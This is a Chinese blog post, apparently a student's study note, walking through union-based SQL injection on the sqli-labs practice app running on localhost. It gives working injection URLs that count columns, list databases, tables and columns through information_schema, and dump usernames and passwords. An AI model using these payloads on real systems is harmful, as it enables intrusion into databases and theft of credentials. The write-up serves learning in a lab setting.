---
title: sql注入练习
date: 2020-03-03 15:04:05
tags: SQL注入
categories: 技术
photos: https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(7).jpg.webp
---



最近学习sql注入里最简单的一种——**联合查询注入**。
现在写下来理清思路，也分享分享自己的收获。

联合查询的前提条件：**页面上有显示位**。

什么是显示位？
在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位。
联合查询的过程：
1、判断注入点
2、判断列数
3、获取所有数据库名
4、获取数据库所有表名
5、获取字段名
6、获取字段中的数据

首先，SQL注入变量的后边添加输入id=1或id=2，回显页面不同。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302112044109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)
一，判断闭合符号。
常见的有:" , ' ,')  ,")  ,或者没有闭合符合（最危险）
首先在url框里输入id=1",回显正常。这就说明这不是闭合符号，我们再换一个。
输入id=1',出现了报错，这就说明  '  是闭合符号。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302113224263.png)
  二，判断列数
  在order by 后面1 ，2 ，3，......直到报错。


> http://localhost/sqli-labs-master/Less-1/?id=1' order by 4--+

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302114058717.png)
这就知道了总共有3列。

> http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,2,3--+


我们将id=0(数据库中不存在的数)，这样会回显我们输入的数。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302115651793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)
2,3的位置就是我们输入的。
三，获取所有数据库名。

> http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,database(),3--+

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302120529852.png)
这样数据库就出来了。
四，获取数据库里所有表名。
下面所需的名称及解释就直接用学长的了。

> 在此之前，我们要知道在MySQL中有information_schema这个库，该库存放了所有数据库的信息。
information_schema.columns包含所有表的字段
table_schema 数据库名
table_name 表名
column_name 列名
information_schema.tables包含所有库的表名
table_schema 数据库名
table_name 表名
information_schema.schemata包含所有数据库的名
schema_name 数据库名
group_concat()函数功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。
————————————————
版权声明：本文为CSDN博主「~Lemon」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/qq_43431158/article/details/90743320

下面直接获取数据表名。

```cpp
http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302123834782.png)

五，获取字段名。

```cpp
http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302124813636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)
六，获取字段中的数值。

```cpp
http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+
```
注意：0x3a是区分用户名和密码的。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302125431134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)
用户名和密码都知道了，剩下的自己想吧。
